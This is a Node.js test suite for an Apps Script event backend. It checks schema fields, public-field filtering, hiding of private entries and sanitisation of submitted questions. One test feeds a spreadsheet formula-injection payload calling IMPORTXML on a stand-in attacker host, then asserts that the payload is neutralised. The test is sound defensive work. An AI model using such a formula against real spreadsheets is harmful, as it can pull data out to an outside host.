import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import test from "node:test";
import vm from "node:vm";
import { fileURLToPath } from "node:url";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const scriptFiles = [
  "Schema.js",
  "Config.js",
  "Security.js",
  "Repository.js",
  "Code.js",
];

function createHarness() {
  const cache = new Map();
  const properties = new Map([
    ["APP_MODE", "test"],
    ["TEST_SPREADSHEET_ID", "sheet-test"],
  ]);
  let uuidCounter = 0;
  const sheets = {
    Settings: [
      [
        "setting_id",
        "event_code",
        "setting_key",
        "value_zh",
        "value_en",
        "data_type",
        "created_at",
        "updated_at",
        "status",
        "is_public",
      ],
      [
        "SET-1",
        "IMPR-DEMO",
        "event_name",
        "公開活動",
        "Public Event",
        "string",
        "2026-08-22",
        "2026-08-22",
        "published",
        true,
      ],
      [
        "SET-2",
        "IMPR-DEMO",
        "internal_note",
        "不可公開",
        "Private",
        "string",
        "2026-08-22",
        "2026-08-22",
        "draft",
        false,
      ],
    ],
    Speakers: [
      [
        "speaker_id",
        "event_code",
        "name_zh",
        "name_en",
        "title_zh",
        "title_en",
        "organization_zh",
        "organization_en",
        "bio_zh",
        "bio_en",
        "photo_url",
        "website_url",
        "sort_order",
        "created_at",
        "updated_at",
        "status",
        "is_public",
        "private_email",
      ],
      [
        "SPK-1",
        "IMPR-DEMO",
        "王大同",
        "Taylor Wang",
        "董事長",
        "Chair",
        "範例公司",
        "Example Co.",
        "公開簡介",
        "Public bio",
        "",
        "",
        1,
        "2026-08-22",
        "2026-08-22",
        "published",
        true,
        "private@example.com",
      ],
      [
        "SPK-2",
        "IMPR-DEMO",
        "未公開講者",
        "Private Speaker",
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        2,
        "2026-08-22",
        "2026-08-22",
        "published",
        false,
        "hidden@example.com",
      ],
    ],
    Agenda: [["agenda_id", "event_code", "status", "is_public"]],
    FAQ: [["faq_id", "event_code", "status", "is_public"]],
    Glossary: [["glossary_id", "event_code", "status", "is_public"]],
    Questions: null,
    AuditLog: null,
  };

  const context = {
    console,
    Date,
    JSON,
    Math,
    Object,
    RegExp,
    String,
    Error,
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (key) => properties.get(key) ?? null,
        setProperty: (key, value) => properties.set(key, value),
      }),
    },
    CacheService: {
      getScriptCache: () => ({
        get: (key) => cache.get(key) ?? null,
        put: (key, value) => cache.set(key, value),
        remove: (key) => cache.delete(key),
      }),
    },
    Utilities: {
      DigestAlgorithm: { SHA_256: "SHA_256" },
      computeDigest: (_algorithm, value) => [
        ...Buffer.from(value.padEnd(32, "0").slice(0, 32)),
      ],
      getUuid: () => `uuid-${++uuidCounter}`,
    },
    LockService: {
      getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }),
    },
    SpreadsheetApp: {
      openById: () => ({
        getSheetByName: (name) => {
          if (!(name in sheets)) return null;
          if (sheets[name] === null) {
            const schema = context.SHEET_SCHEMAS[name];
            sheets[name] = [schema.fields.map((field) => field.name)];
          }
          return {
            getDataRange: () => ({ getValues: () => sheets[name] }),
            appendRow: (row) => sheets[name].push(row),
          };
        },
      }),
    },
    ContentService: {
      MimeType: { JSON: "application/json" },
      createTextOutput: (value) => ({
        value,
        mimeType: null,
        setMimeType(mimeType) {
          this.mimeType = mimeType;
          return this;
        },
      }),
    },
  };
  vm.createContext(context);
  for (const file of scriptFiles) {
    const source = fs.readFileSync(
      path.join(root, "apps-script", file),
      "utf8",
    );
    vm.runInContext(source, context, { filename: file });
  }
  return { context, sheets };
}

function parseResponse(output) {
  assert.equal(output.mimeType, "application/json");
  return JSON.parse(output.value);
}

test("all eleven sheets have common governance fields and an example", () => {
  const { context } = createHarness();
  const names = Object.keys(context.SHEET_SCHEMAS);
  assert.equal(names.length, 11);
  for (const name of names) {
    const schema = context.SHEET_SCHEMAS[name];
    const fields = schema.fields.map((field) => field.name);
    assert.ok(fields.includes(schema.idField), `${name} has an ID`);
    for (const common of ["created_at", "updated_at", "status", "is_public"]) {
      assert.ok(fields.includes(common), `${name} has ${common}`);
    }
    assert.equal(
      schema.example.length,
      schema.fields.length,
      `${name} example matches schema`,
    );
  }
});

test("public speakers endpoint returns only public allowlisted fields", () => {
  const { context } = createHarness();
  const output = context.doGet({
    parameter: {
      action: "speakers",
      event_code: "IMPR-DEMO",
      client_id: "client_123456",
    },
  });
  const body = parseResponse(output);
  assert.equal(body.success, true);
  assert.equal(body.data.length, 1);
  assert.equal(body.data[0].speaker_id, "SPK-1");
  assert.equal("private_email" in body.data[0], false);
  assert.equal(body.meta.mode, "test");
  assert.ok(body.meta.request_id);
});

test("private or draft settings never appear in the public response", () => {
  const { context } = createHarness();
  const output = context.doGet({
    parameter: {
      action: "settings",
      event_code: "IMPR-DEMO",
      client_id: "client_123456",
    },
  });
  const body = parseResponse(output);
  assert.equal(body.success, true);
  assert.deepEqual(
    body.data.map((row) => row.setting_id),
    ["SET-1"],
  );
});

test("question submission sanitizes formulas and writes a non-public row plus audit log", () => {
  const { context, sheets } = createHarness();
  const output = context.doPost({
    parameter: {},
    postData: {
      contents: JSON.stringify({
        action: "submitQuestion",
        event_code: "IMPR-DEMO",
        session_id: "AGN-DEMO-001",
        question_text: '=IMPORTXML("https://attacker.invalid")',
        language: "zh-Hant",
        client_id: "client_123456",
      }),
    },
  });
  const body = parseResponse(output);
  assert.equal(body.success, true);
  assert.equal(body.data.moderation_status, "pending");

  const questionHeaders = sheets.Questions[0];
  const question = Object.fromEntries(
    questionHeaders.map((header, index) => [
      header,
      sheets.Questions[1][index],
    ]),
  );
  assert.equal(question.question_text.startsWith("'="), true);
  assert.equal(question.is_public, false);
  assert.equal(question.moderation_status, "pending");

  assert.equal(sheets.AuditLog.length, 2);
  const auditHeaders = sheets.AuditLog[0];
  const audit = Object.fromEntries(
    auditHeaders.map((header, index) => [header, sheets.AuditLog[1][index]]),
  );
  assert.equal(audit.action, "question.create");
  assert.equal(audit.result, "success");
  assert.equal(audit.details_json.includes("IMPORTXML"), false);
});

test("invalid inputs use the uniform error envelope", () => {
  const { context } = createHarness();
  const output = context.doPost({
    parameter: {},
    postData: { contents: "not-json" },
  });
  const body = parseResponse(output);
  assert.equal(body.success, false);
  assert.equal(body.data, null);
  assert.equal(body.error.code, "INVALID_JSON");
  assert.ok(body.meta.timestamp);
});

test("question text length is capped at 1000 characters", () => {
  const { context } = createHarness();
  assert.throws(
    () =>
      context.validateQuestion({
        event_code: "IMPR-DEMO",
        question_text: "a".repeat(1001),
        language: "en",
        client_id: "client_123456",
      }),
    /不得超過 1000/,
  );
});
